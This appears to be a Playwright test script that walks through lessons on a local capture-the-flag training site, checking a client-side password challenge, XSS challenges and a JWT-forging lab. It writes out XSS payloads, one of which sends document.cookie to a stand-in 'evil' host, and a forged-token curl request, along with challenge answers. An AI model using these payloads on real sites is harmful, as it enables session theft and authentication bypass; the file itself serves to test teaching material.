import { chromium } from "playwright-core";
process.env.TMPDIR = new URL("./tmp", import.meta.url).pathname;
const b = await chromium.launch({ executablePath: process.env.HOME + "/.cache/ms-playwright/chromium-1243/chrome-linux64/chrome" });
const p = await b.newPage({ viewport: { width: 1440, height: 1600 } });
const errs = []; p.on("pageerror", e => errs.push("pageerror: " + e.message)); p.on("console", m => m.type()==="error" && errs.push("console: "+m.text()));
const B = "http://127.0.0.1:9102/";

// ---- web-recon clientauth bypass ----
await p.goto(B + "#/learn/web-recon"); await p.waitForTimeout(900);
// find the clientauth form (vault). password = m0_khoa_ngay
const caForm = p.locator("#chal-web-recon-4 form.fake-page");
await caForm.locator("input[name=pw]").fill("m0_khoa_ngay");
await caForm.locator("button:has-text(\"Mở\")").click(); await p.waitForTimeout(200);
console.log("clientauth:", (await caForm.locator(".res").innerText()).trim());

// ---- web-xss alert ----
await p.goto(B + "#/learn/web-xss"); await p.waitForTimeout(900);
const x1 = p.locator("#chal-web-xss-1 .xss-box");
await x1.locator("textarea").fill("<img src=x onerror=alert(1)>");
await x1.locator("button").click(); await p.waitForTimeout(900);
console.log("xss-alert:", (await x1.locator(".xss-log").innerText()).trim().replace(/\n/g," | "));

// ---- web-xss cookie ----
const x2 = p.locator("#chal-web-xss-2 .xss-box");
await x2.locator("textarea").fill('<img src=x onerror="new Image().src=\'//evil/?c=\'+document.cookie">');
await x2.locator("button").click(); await p.waitForTimeout(900);
console.log("xss-cookie:", (await x2.locator(".xss-log").innerText()).trim().replace(/\n/g," | "));

// ---- web-auth JWT python forge (run the editor, then curl the printed token via the shell on same page) ----
await p.goto(B + "#/learn/web-auth"); await p.waitForTimeout(900);
await p.locator(".py-editor button[data-a=run]").first().click();
await p.waitForTimeout(12000);
const pyout = await p.locator(".py-editor .py-out").first().innerText();
console.log("jwt-python-output:", pyout.trim().replace(/\n/g, " || "));
// extract token, send via shell curl on same lesson page
const tok = pyout.trim().split("\n")[0];
const sh = p.locator("#chal-web-auth-2, .shell").first(); // the shell widget on this page
const shInput = p.locator(".shell-line input").first();
await shInput.fill(`curl -H "Authorization: Bearer ${tok}" http://lab.zctf.local/lab/web_auth/me`);
await shInput.press("Enter"); await p.waitForTimeout(1200);
const shOut = await p.locator(".shell-out").first().innerText();
console.log("jwt-via-curl:", (shOut.match(/zCTF\{[^}]*\}/) || ["(không thấy flag)"])[0]);

await p.screenshot({ path: new URL("./shots/web-auth.png", import.meta.url).pathname, fullPage: false });
console.log("ERRORS:", errs.length ? errs : "none");
await b.close();
